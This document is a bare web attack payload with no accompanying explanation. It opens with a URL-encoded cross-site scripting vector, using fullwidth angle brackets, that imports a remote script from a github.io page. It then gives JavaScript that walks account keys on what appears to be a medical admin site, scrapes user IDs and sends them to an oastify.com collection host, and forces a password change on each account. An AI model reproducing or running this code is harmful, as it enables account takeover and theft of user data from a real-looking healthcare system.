%uff1cimg%20src=d%20onerror=import("https://tomoncrss.github.io/jsfile/payload.js")%uff1e




for (let i = 199300; i <= 199301; i++) {
  fetch(`https://pateng.erad.com/Admin/AdminUsers/Edit?aPatientKey=${i}`)
    .then(res => res.text())
    .then(res => {
      let match = res.match(/id='UserIDText'>(.*?)<\/span>/);
      if (match) {
        fetch(`https://7v38ezsvngwu5goi5lsma1v25tbkzb4zt.oastify.com?data=${encodeURIComponent(match[1])}`);
      }
      return fetch("https://pateng.erad.com/Admin/AdminUsers/SavePasswordChange", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `aPatientKey=${i}&NewPassword=Test%40123%4012`
      });
    });
}
